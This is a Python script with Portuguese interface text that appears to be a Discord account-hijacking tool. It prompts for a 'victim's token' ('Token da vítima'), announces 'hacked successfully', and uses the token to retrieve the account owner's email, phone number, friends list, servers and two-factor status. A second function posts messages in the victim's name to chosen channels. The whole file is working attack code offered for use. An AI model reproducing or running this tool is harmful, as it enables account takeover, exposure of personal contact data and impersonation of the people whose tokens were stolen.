import os, cores as c, banners, requests
from pystyle import Colorate, Colors
from rich.panel import Panel
from rich.console import Console
import sys, time
from datetime import datetime
console=Console()
def inter():
  print(banners.banner3)
  print(f'\n{c.red}Disnet: {c.white}Verificando a internet...')
  url = 'https://www.google.com'
  timeout = 5
  time.sleep(4)
  try:
        requests.get(url, timeout=timeout)
  except ConnectionError:
        print(f'\nNão foi possível se conectar ao {c.red}Disnet{c.white}.\nTente novamente mais tarde.')
        sys.exit()
  else:
    print(f'\n{c.green}Conectado ao Disnet{c.white}')
    time.sleep(1)
    os.system('clear')
def CT():
    os.system('clear')
    print(Colorate.Vertical(Colors.red_to_yellow, banners.banner2))
    token=input(f'\n[{c.red}>{c.white}] Token da vítima: ')
    head = {'Authorization': str(token)}
    src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)
    if src.status_code != 200:
      print(f'\n{c.bred}[ ! ] Oh não ! esse token é inválido ;({c.white}')
      input('\n[ENTER] para voltar ao menu.')
    else:
      headers = {'Authorization': token, 'Content-Type': 'application/json'}
      r = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
      if r.status_code == 200:
         os.system('clear')
         print(Colorate.Vertical(Colors.red_to_yellow, banners.banner1))
         print('\n[💉] Hackeado com sucesso !')
         def get_server_names(token):
           headers = {'Authorization': token, 'Content-Type': 'application/json'}
           response = requests.get('https://discord.com/api/v10/users/@me/guilds', headers=headers)
    
           server_names = [server['name'] for server in response.json()] if response.status_code == 200 else []
            

           return server_names
         name_servers=get_server_names(token)
         def get_friend_names(token):
          headers = {'Authorization': token, 'Content-Type': 'application/json'}
          response = requests.get('https://discord.com/api/v10/users/@me/relationships', headers=headers)
    
          friend_names = [friend['user']['username'] for friend in response.json() if 'user' in friend] if response.status_code == 200 else []

          return friend_names
         friend_names = get_friend_names(token)
         def get_badges(flags):
           badge_flags = {
        1: "Staff",
        2: "Partner",
        4: "Hypesquad Events",
        8: "Bug Hunter Level 1",
        16: "House Bravery",
        32: "House Brilliance",
        64: "House Balance",
        128: "Early Supporter",
        256: "Team User",
        512: "System",
        1024: "Bug Hunter Level 2",
        4096: "Verified Bot",
        16384: "Early Verified Bot Developer",
        65536: "Discord Certified Moderator"
    }
           badges = [badge_flags[flag] for flag in badge_flags if flag & flags]
           return ', '.join(badges) if badges else "Sem flags"
         linguagens = {
    'da'    : 'Dinamarquês, Dinamarca',
    'de'    : 'Alemão, Alemanha',
    'en-GB' : 'Inglês, Reino Unido',
    'en-US' : 'Inglês, Estados Unidos',
    'es-ES' : 'Espanhol, Espanha',
    'fr'    : 'Francês, França',
    'hr'    : 'Croata, Croácia',
    'lt'    : 'Lituano, Lituânia',
    'hu'    : 'Húngaro, Hungria',
    'nl'    : 'Holandês, Holanda',
    'no'    : 'Norueguês, Noruega',
    'pl'    : 'Polonês, Polônia',
    'pt-BR' : 'Português Brasil, Brasil',
    'ro'    : 'Romeno, Romênia',
    'fi'    : 'Finlandês, Finlândia',
    'sv-SE' : 'Sueco, Suécia',
    'vi'    : 'Vietnamita, Virtna',
    'tr'    : 'Turco, Turquia',
    'cs'    : 'Tcheco, República Tcheca',
    'el'    : 'Grego, Grécia',
    'bg'    : 'Búlgaro, Bulgária',
    'ru'    : 'Russo, Russia',
    'uk'    : 'Ucraniano, Ucrânia',
    'th'    : 'Tailandês, Tailândia',
    'zh-CN' : 'Chinês, China',
    'ja'    : 'Japonês, Japão',
    'zh-TW' : 'Chinês, Taiwan',
    'ko'    : 'Coreano, Coreia'
             }
         friend_names_text = '\n'.join(friend_names) if friend_names else '  [cyan]Nenhum amigo encontrado.[white]'
         server_names_text = '\n'.join(name_servers) if name_servers else '  [cyan]Nenhum servidor encontrado.[white]'
         userName = r.json()['username'] + '#' + r.json()['discriminator']
         userID = r.json()['id']
         name = r.json()['global_name']
         vatar = r.json()['avatar']
         avatar_url = f'https://cdn.discordapp.com/avatars/{userID}/{vatar}.webp'
         accent_color = r.json()['accent_color']
         phone = r.json()['phone']
         email = r.json()['email']
         mfa = r.json()['mfa_enabled']
         flags = r.json()['flags']
         verem = r.json()['verified']
         locale = r.json()['locale']
         pl = linguagens.get(locale)
         badges = get_badges(flags)
         nitro = r.json()['premium_type']
         Cdate = datetime.utcfromtimestamp(((int(userID) >> 22) + 1420070400000) / 1000).strftime('%d/%m/%Y %H:%M:%S UTC')
         print(f'\n[🧪] Token: {token}\n')
         if mfa==True:
          mfa='Sim'
         else:
           mfa='Não'
         if verem==True:
           verem='Sim'
         else:
           verem='Não'
         if nitro==1:
           nitro='Nitro Classic'
         elif nitro==2:
            nitro='Nitro'
         elif nitro==3:
           nitro='Nitro Basic'
         else:
           nitro='Sem nitro'
         if vatar==None:
           avatar_url='Sem foto de perfil (ícone padrão do Discord)'
         console.print(Panel.fit(f'''
  <<───────────Info básicas 🧾───────────>>

[red]ID do usuário :[white] {userID}

[red]Nome de usuário :[white] {userName}
[red]Nome exebido :[white] {name}

[red]Ícone do perfil :[white] {avatar_url}

[red]Entrou no discord em :[white] {Cdate}

[red]Língua :[white] {locale} ({pl})

[red]Cor do banner :[white] {'(HEX) '+str(accent_color) if accent_color else "Automático"}

[red]↓ Amigos ↓[white]

{friend_names_text}

[red]↓ Servidores que o usuário participa ↓[white]

{server_names_text}


  <<──────────────Nitro 🚀──────────────>>

[red]Nitro :[white] {nitro}

  <<────────────Seguraça 🔐────────────>>

[red]Possui verificação de 2 fatores ? :[white] {mfa}

[red]O email é verificado pelo discord ? :[white] {verem}

   <<──────────Flags ⛳───────────>>

[red]Flags : [white]{badges}

   <<────────────Contato 📫────────────>>

[red]Email :[white] {email}

[red]Número de telefone :[white] {phone if phone else "[cyan]Não registrado[white]"}

''', title='🔥'))
         input('\n[ENTER] para voltar ao menu.')
def MS(token, server_id, channel_id, message):
    head = {'Authorization': str(token)}
    src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)
    if src.status_code != 200:
      print(f'\n{c.bred}[ ! ] Oh não ! esse token é inválido ;({c.white}')
      input('\n[ENTER] para voltar ao menu.')
    else:
      headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    
      payload = {
        'content': message
    }

      server_url = f'https://discord.com/api/v10/guilds/{server_id}'
      channel_url = f'https://discord.com/api/v10/channels/{channel_id}'
    
      url = f'https://discord.com/api/v10/channels/{channel_id}/messages'

      server_response = requests.get(server_url, headers=headers)
      if server_response.status_code != 200:
        print(f'\n{c.bred}[ ! ] O servidor {server_id} não existe ou você não tem acesso !{c.white}')
        return
    
      channel_response = requests.get(channel_url, headers=headers)
      if channel_response.status_code != 200:
        print(f'\n{c.bred}[ ! ] O canal {channel_id} não existe ou você não tem acesso !{c.white}')
       
      response = requests.post(url, headers=headers, json=payload)
    
      if response.status_code == 200:
          print(f'\n{c.bgreen}[ ! ] A mensagem foi enviada com sucesso em {server_id}#{channel_id}{c.white}')
      else:
        print(f'\n{c.bred}[ ! ] Erro ao enviar mensagem.\nPossíveis causas\n\n• status 400\n• Você não tem permissão para enviar mensagem no canal.')
      input('\n[ENTER] para voltar ao menu.')
